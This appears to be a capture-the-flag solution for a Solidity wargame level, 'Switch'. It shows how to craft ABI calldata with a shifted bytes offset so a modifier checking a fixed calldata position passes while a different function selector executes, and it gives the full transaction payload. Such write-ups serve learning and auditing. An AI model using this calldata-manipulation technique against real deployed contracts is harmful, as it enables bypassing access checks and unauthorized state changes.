# Answer

Goal: Set `switchOn` value to true in `Switch` contract instance.

## 1. Understanding data flow

The contract has only one accessible function `flipSwitch` and the main challenge is to both call the function we desire `turnSwitchOn()` and satisfy the modifier `onlyOff`. After analysing `onlyOff` modifier it's clear that it does not adapt to `calldata` size and simply checks a 4 byte sequence at 68 byte position. As long as that specific byte sequence piece matches expected `offSelector` value it will let the function pass.

## 2. Crafting bytes _data

To workaround `onlyOff` modifier we look at how bytes type arguments are encoded. And they follow this structure:

```
0000000000000000000000000000000000000000000000000000000000000020 // offset (bytes)
0000000000000000000000000000000000000000000000000000000000000004 // length (bytes)
4242424200000000000000000000000000000000000000000000000000000000 // data
```

And the modifier specifically only checks the location of `42424242` values. The goal is to separate the actual `_data` (function selector) passed to `address(this).call(_data)` and the bytes checked by `onlyOff`. And this can be done by manipulating the encoding (specifically bytes offset value) as follows:

```
0000000000000000000000000000000000000000000000000000000000000060 // offset (bytes - notice the increase)
0000000000000000000000000000000000000000000000000000000000000000 // padding (values don't matter)
20606e1500000000000000000000000000000000000000000000000000000000 // <-- onlyOff checked bytes (turnSwitchOff selector)
0000000000000000000000000000000000000000000000000000000000000004 // length (bytes) <-- actual bytes _data start
76227e1200000000000000000000000000000000000000000000000000000000 // <-- turnSwitchOn function selector
```

## 3. Send transaction

Now all that is left is to craft the transaction:

```javascript
sendTransaction({
  from: player,
  to: contract.address,
  data: '0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000',
})
```

et voilà the switch is on.
